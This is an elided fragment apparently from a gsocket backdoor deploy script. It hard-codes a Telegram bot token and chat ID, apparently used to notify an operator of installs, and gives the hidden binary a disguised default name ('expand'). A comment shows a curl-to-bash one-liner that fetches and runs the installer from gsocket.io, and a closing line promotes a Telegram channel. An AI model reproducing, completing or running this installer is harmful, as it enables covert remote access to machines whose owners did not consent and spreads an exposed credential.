...
GS_TG_TOKEN="8245825499:AAHbdOPwQXLnhzMjITfIbPFQ0poy9oG1LEw"
GS_TG_CHATID="8245825499"
...
BIN_HIDDEN_NAME_DEFAULT="expand"
...
[[ $ret -eq 0 ]] && { 
    telegramToken="8245825499:AAHbdOPwQXLnhzMjITfIbPFQ0poy9oG1LEw"
	chatId="8245825499"
...
init_setup
# User supplied install-secret: X=MySecret bash -c "$(curl -fsSL https://gsocket.io/a)"
[[ -n "$X" ]] && GS_SECRET_X="$X"
...
echo -e "--> ${CW}Join us on Telegram - https://t.me/syndcat3${CN}"
